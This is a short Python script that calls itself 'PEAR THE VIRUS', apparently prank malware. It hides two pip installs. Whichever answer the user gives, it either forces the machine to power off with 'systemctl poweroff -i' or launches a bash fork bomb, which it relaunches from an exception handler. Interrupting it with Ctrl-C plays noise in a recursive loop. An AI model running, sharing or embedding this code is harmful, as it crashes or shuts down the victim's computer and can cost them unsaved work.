#!/usr/bin/python3
import sys,os
os.system('pip install art>/dev/null')
os.system('pip install whitenoise-player>/dev/null')
from whitenoise import play as wp
from art import *
import time
def print(text,end='\n',timeout=0.1):
    for i in text+end:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(timeout)
def ask():
    print('Are you sure you want to continue?(y/n)',end=' ')
    m=input()
    if m not in ['y','n','Y','N']:
        print('Bad option')
        ask()
    if m.lower()=='y':
        return
    print('OK, so i will only turn ur computer off')
    os.system('systemctl poweroff -i')
def main():
    print('Hi there, i am')
    tprint('PEAR')
    time.sleep(0.5)
    tprint('THE')
    time.sleep(0.5)
    tprint('VIRUS!')
    time.sleep(0.4)
    print('I was designed to slow down your computer!')
    print('  \n  ')
    ask()
    print('I WILL KILL YOU')

    os.system('bash -c ":(){ :|:& };: &"')
    while True:
        try:
            tprint('BAD')
            time.sleep(0.5)
        except:
           os.system('bash -c ":(){ :|:& };: &"')
 
def _pacat():
    print('YOU INTERRUPTED ME! I will now play bad sound!',timeout=0.05)
    wp()
def pacat():
    try:
        _pacat()
    except KeyboardInterrupt:
        pacat()
if __name__=='__main__':
    try:
        main()
    except KeyboardInterrupt:
        pacat()
